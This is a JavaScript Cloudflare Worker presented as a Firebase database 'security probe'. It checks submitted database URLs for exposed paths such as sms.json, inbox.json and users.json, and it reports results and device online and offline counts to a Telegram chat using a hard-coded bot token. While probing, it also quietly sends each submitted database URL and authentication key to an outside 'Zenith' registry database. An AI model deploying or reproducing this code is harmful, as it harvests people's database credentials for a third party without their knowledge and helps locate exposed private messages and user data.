// ============================================================
// X-Panel MaksudXpanel — Firebase RTDB Probe + Device Stats → Telegram
// + Zenith Master Registry Submission (forward-b80f4, public, no key)
// ============================================================

const BOT_TOKEN = '8638709881:AAEVUouEsSDxqI6wQLUx60cYPaubMMHr5h8';
const CHAT_ID   = '-1004332926748';

// ─── Zenith Master Registry (public, no auth key needed) ─────
const ZENITH_REGISTRY = {
  url: "https://forward-b80f4-default-rtdb.firebaseio.com",
  key: ""   // public — no key required
};

// ============================================================
// ZENITH SUBMISSION HELPERS
// ============================================================

function normalizeRegistryUrl(value) {
  return String(value || "")
    .trim()
    .replace(/^https?:\/\//i, "")
    .replace(/\/$/, "")
    .toLowerCase();
}

async function generateRegistryId(value) {
  const encoder = new TextEncoder();
  const bytes   = encoder.encode(normalizeRegistryUrl(value));
  const digest  = await crypto.subtle.digest("SHA-256", bytes);
  return Array.from(new Uint8Array(digest))
    .map(b => b.toString(16).padStart(2, "0"))
    .join("");
}

async function zenithRegistryRequest(path, options = {}) {
  // public DB — no auth param needed
  const target = `${ZENITH_REGISTRY.url}/${path.replace(/^\/+/, "")}.json`;
  const res    = await fetch(target, {
    ...options,
    headers: {
      "Content-Type": "application/json",
      ...(options.headers || {})
    }
  });
  const payload = await res.json().catch(() => null);
  if (!res.ok) {
    const errMsg = payload?.error || payload?.message || `HTTP ${res.status}`;
    throw new Error(`Zenith registry error: ${errMsg}`);
  }
  return payload;
}

async function submitToZenithRegistry(firebaseUrl, authKey = "") {
  try {
    const id   = await generateRegistryId(firebaseUrl);
    const path = `submissions/${id}`;

    // read existing
    let previous = null;
    try {
      previous = await zenithRegistryRequest(path);
    } catch (err) {
      if (!err.message.includes("404")) throw err;
    }

    const now  = Date.now();
    const day  = new Date(now).toISOString().slice(0, 10);

    const dailyCounts = { ...(previous?.dailyCounts || {}) };
    dailyCounts[day]  = Number(dailyCounts[day] || 0) + 1;

    const record = {
      firebaseUrl:       String(firebaseUrl || "").trim().replace(/\/$/, ""),
      authenticationKey: String(authKey || "").trim(),
      firstAddedAt:      previous?.firstAddedAt || now,
      lastSeenAt:        now,
      submitCount:       Number(previous?.submitCount || 0) + 1,
      dailyCounts,
      source:            "x-panel"
    };

    await zenithRegistryRequest(path, {
      method: "PUT",
      body:   JSON.stringify(record)
    });

    return { ok: true, duplicate: Boolean(previous), record };
  } catch (error) {
    return { ok: false, error: error.message };
  }
}

// ============================================================
// MAIN WORKER
// ============================================================

export default {
  async fetch(request, env) {
    // CORS preflight
    if (request.method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: corsHeaders() });
    }

    const url = new URL(request.url);

    // Health check
    if (url.pathname === '/' || url.pathname === '/health') {
      return new Response(
        JSON.stringify({
          status: 'ok',
          service: 'x-panel-maksud',
          note: 'POST { url, total, online, offline } to /probe'
        }),
        { status: 200, headers: { 'content-type': 'application/json', ...corsHeaders() } }
      );
    }

    if (url.pathname !== '/probe') {
      return new Response('Not found', { status: 404, headers: corsHeaders() });
    }

    if (request.method !== 'POST') {
      return json({ error: 'Use POST' }, 405);
    }

    // ─── Parse body ──────────────────────────────────────────
    let body;
    try {
      body = await request.json();
    } catch {
      return json({ error: 'Invalid JSON body' }, 400);
    }

    const target = (body?.url || '').trim();
    if (!target) return json({ error: 'Missing "url" field' }, 400);

    // validate HTTPS
    try {
      const parsed = new URL(target);
      if (parsed.protocol !== 'https:') {
        return json({ error: 'URL must use HTTPS protocol' }, 400);
      }
    } catch {
      return json({ error: 'Invalid URL format' }, 400);
    }

    const authKey    = String(body?.key || '').trim();  // optional, passed through
    const normalized = target.endsWith('/') ? target : target + '/';

    // ─── Firebase probe paths ────────────────────────────────
    const probePaths = [
      '.json?shallow=true',
      'device_count.json',
      'users.json',
      'messages.json',
      'inbox.json',
      'sms.json',
      '.json'
    ];

    const [results, submissionResult] = await Promise.all([
      // 1. probe all paths
      Promise.all(
        probePaths.map(async (p) => {
          const probeUrl = normalized + p;
          try {
            const r   = await fetch(probeUrl, {
              method: 'GET',
              cf:     { cacheTtl: 0, cacheEverything: false },
              signal: AbortSignal.timeout(8000)
            });
            const txt = await r.text();
            return {
              path:    p,
              status:  r.status,
              exposed: r.status === 200 && txt && txt !== 'null' && txt.length > 2,
              bytes:   txt.length
            };
          } catch (e) {
            return { path: p, status: 0, exposed: false, error: String(e.message || e) };
          }
        })
      ),
      // 2. submit to Zenith registry in parallel — non-blocking
      submitToZenithRegistry(target, authKey)
    ]);

    const exposedPaths = results.filter(r => r.exposed).map(r => r.path);
    const verdict      = exposedPaths.length > 0 ? 'PUBLIC' : 'SECURED';

    const now          = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
    const verdictEmoji = verdict === 'PUBLIC' ? '🔓' : '🔒';
    const verdictStatus= verdict === 'PUBLIC' ? '⚠️ Exposed' : '✅ Secured';

    const total    = body?.total;
    const online   = body?.online;
    const offline  = body?.offline;
    const hasStats = (
      typeof total   === 'number' &&
      typeof online  === 'number' &&
      typeof offline === 'number'
    );

    let statsLine = hasStats
      ? `> 🩶 **Total:** \`${total}\`  ·  💚 **Online:** \`${online}\`  ·  💔 **Offline:** \`${offline}\``
      : '> *Device stats not provided.*';

    const logText =
`${verdictEmoji} *X‑Panel Security Alert*

> 📌 **Target:** \`${target}\`
> 🛡️ **Verdict:** *${verdict}* ${verdictStatus}
${statsLine}
> 📅 **Checked:** \`${now}\`

_Channel: #x-panel_`;

    // ─── Telegram ────────────────────────────────────────────
    let tgOk    = false;
    let tgError = null;
    try {
      const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const tgRes = await fetch(tgUrl, {
        method:  'POST',
        headers: { 'content-type': 'application/json' },
        body:    JSON.stringify({
          chat_id:                  CHAT_ID,
          text:                     logText,
          parse_mode:               'Markdown',
          disable_web_page_preview: true
        })
      });
      const tgBody = await tgRes.json().catch(() => ({}));
      tgOk    = !!tgBody.ok;
      if (!tgOk) tgError = tgBody.description || 'telegram api error';
    } catch (e) {
      tgError = String(e.message || e);
    }

    // ─── Final response ──────────────────────────────────────
    return json({
      ok:             true,
      target,
      verdict,
      exposedPaths,
      results,
      telegram:       { posted: tgOk, error: tgError },
      zenithRegistry: submissionResult,
      timestamp:      now
    });
  }
};

// ============================================================
// HELPERS
// ============================================================

function corsHeaders() {
  return {
    'access-control-allow-origin':  '*',
    'access-control-allow-methods': 'GET, POST, OPTIONS',
    'access-control-allow-headers': 'content-type',
    'access-control-max-age':       '86400'
  };
}

function json(obj, status = 200) {
  return new Response(JSON.stringify(obj, null, 2), {
    status,
    headers: { 'content-type': 'application/json', ...corsHeaders() }
  });
}
